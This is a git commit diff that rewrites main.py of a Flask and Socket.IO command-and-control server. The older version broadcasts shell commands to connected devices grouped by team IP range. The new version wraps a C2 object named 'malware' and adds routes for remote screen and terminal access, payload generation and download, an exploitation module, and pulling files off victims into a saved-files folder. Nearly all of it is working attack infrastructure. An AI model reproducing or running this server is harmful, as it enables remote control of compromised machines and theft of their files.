cacc5290015e3127a2a64fd3b784543c5ef167ca
elon-mouse <142508817+elon-mouse@users.noreply.github.com>
2024-11-13 17:04:07 -0500

    Add files via upload

--- main.py
+++ main.py
@@ -1,129 +1,124 @@
+from flask import Flask, render_template, request, redirect, send_from_directory
 import eventlet
 import socketio
-from flask import Flask, render_template, request, send_file
+from c2 import C2
+import os
+import json
 
-sio = socketio.Server(cors_allowed_origins='*', logger=False)
+
 app = Flask(__name__)
+sio = socketio.Server(cors_allowed_origins='*', logger=False, max_http_buffer_size=1e8 )
+malware = C2(sio)
 
-
-@app.route('/')
+@app.route("/")
 def index():
-  return render_template('index.html')
-  
-@app.route('/video')
-def video():
-  return send_file("video.mp4", as_attachment=True)
-
-@app.errorhandler(404)
-def catch_all(error):
-    path = request.path
-    sid = path.strip('/')  # Remove leading and trailing slashes
-    if sid in connectedUsers:
-        return render_template('connection.html')
-    sid = sid.replace("/upload", "")
-    print(sid)
-    if sid in connectedUsers:
-        return render_template("send.html")
     return render_template("index.html")
 
+@app.route("/files")
+def upload():
+    return render_template("upload.html")
 
-connectedUsers = {}
+@app.route("/payload")
+def payload():
+    return render_template("payload.html")
 
-
-@sio.on('devices')
-def returnConnected(sid):
-  return connectedUsers
-
-
-@sio.on('connect')
-def connect(sid, environ):
-  print(f'{sid} connected :)')
-
-
-def ip_exists(ip, my_dict):
-    for value in my_dict.values():
-        if value == ip:
-            return True
-    return False
-
-@sio.on('dataConnection')
-def dataConnection(sid, ip):
-  if (ip_exists(ip, connectedUsers) == False):
-    connectedUsers[sid] = ip
-
-@sio.on('commandTeam')
-def commandTeam(sid, data):
-  if (data["TEAM"] in [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,24]):
-    teamIPs = {key: value for key, value in connectedUsers.items() if str(value).startswith("172." + str(data["TEAM"]))}
-    if teamIPs != {}:
-      IPs = [teamIPs.get(i) for i in teamIPs]
-      for i in IPs:
-        sio.emit("commandToClient", {
-            "COMMAND": data["COMMAND"],
-            "IP": i
-        })
-      return f"Command sent to {IPs}"
+@app.route("/screen/<path:path>")
+def screen(path):
+    devices = malware.list_devices()
+    if path in devices:
+        return render_template("screen.html")
     else:
-      return f"No devices found from team {data['TEAM']}"
-  else:
-    return f"No devices found from team {data['TEAM']}"
+        return redirect('/')
+
+@app.route('/terminal/<path:path>')
+def terminal(path):
+    devices = malware.list_devices()
+    if path in devices:
+        return render_template("terminal.html")
+    else:
+        return redirect('/')
+
+@app.route('/term/<path:path>')
+def term(path):
+    return render_template("jterm.html")
 
 
-@sio.on('command')
-def command(sid, data):
-  #if this shit is not broken don't fix it
-  if data["SID"] not in connectedUsers:
-    sio.emit('resultStage2', {"RESULT": "Device disconnected, please return to main page to reconnect", "SID": data["SID"]})
-    return
-  sio.emit("commandToClient", {
-      "COMMAND": data["COMMAND"],
-      "IP": connectedUsers[data["SID"]]
-  })
+@app.route('/client/<path:filename>')
+def client(filename):
+    return send_from_directory('templates/client', filename)
+
+@app.route('/get_payloads/<path:filename>')
+def get_payloads(filename):
+    return send_from_directory('payloads', filename, as_attachment=True)
 
 
 
 
-@sio.on('file')
-def file(sid, data):
-  sio.emit('fileStage2', {"FILE": data["FILE"], "FILENAME": data["FILENAME"], "SID": data["SID"]})
+@app.route('/devices', methods=['POST'])
+def post():
+    return malware.list_all_devices()
 
-@sio.on('fileUploaded')
-def fileUploaded(sid, data):
-  sio.emit('fileUploadedStage2', {"SUCCESS": data["SUCCESS"], "SID": sid})
+@app.route('/delete', methods=['POST'])
+def delete():
+    data = request.get_json()
+    malware.delete_device(data['device_id'])
+    return ""
 
-@sio.on('getFile')
-def getFile(sid, data):
-  sio.emit("getFileStage2", {
-    "SID": data["SID"],
-    "IP": data["IP"],
-    "FILEPATH": data["FILEPATH"],
-  })
+@app.route('/ctrl', methods=['POST'])
+def ctrl():
+    data = request.get_json()
+    malware.ctrl(data['device_id'])
+    return ""
 
-@sio.on('uploadFile')
-def uploadFile(sid, data):
-  sio.emit("uploadFileStage2", {
-    "FILE": data["FILE"],
-    "FILENAME": data["FILENAME"],
-    "IP": connectedUsers[data["SID"]],
-  })
+@app.route('/payload', methods=['POST'])
+def payload1():
+    data = request.get_json()
+    malware.payload(data)
+    return ""
 
-@sio.on('reset')
-def reset(sid, data):
-  sio.emit("resetStage2", {"IP": connectedUsers[data["SID"]]})
+@app.route('/download', methods=['POST'])
+def download1():
+    data = request.get_json()
+    malware.generate(data)
+    return ""
 
+@app.route('/list_payloads', methods=['POST'])
+def list_payloads():
+    return str(os.listdir('payloads'))
 
-@sio.on('result')
-def result(sid, data):
-  sio.emit('resultStage2', {"RESULT": data, "SID": sid})
-
-
-@sio.on('disconnect')
-def disconnect(sid):
-  if sid in connectedUsers:
-    del connectedUsers[sid]
-    print(f'{sid} disconnected :(')
+@app.route('/explotation_module', methods=['POST'])
+def send_explotation_module():
+    data = request.get_json()
+    malware.explotation_module(data)
+    return ""
 
 
-if __name__ == '__main__':
-  app = socketio.Middleware(sio, app)
-  eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), app)
+@app.route('/upload_file', methods=['POST'])
+def upload_file():
+    data = request
+    malware.upload_file(data)
+    return ""
+
+
+
+@app.route('/download_file', methods=['POST'])
+def download_file():
+    data = request.get_json()
+    malware.download_file(data)
+    return ""
+
+
+@app.route('/get_downloaded_files/<path:filename>')
+def get_downloaded_files(filename):
+    return send_from_directory('files_saved', filename, as_attachment=True)
+
+
+@app.route('/list_files', methods=['POST'])
+def list_files():
+    return str(os.listdir('files_saved'))
+
+
+
+if __name__ == "__main__":
+    flaskApp = socketio.Middleware(sio, app)
+    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), flaskApp)
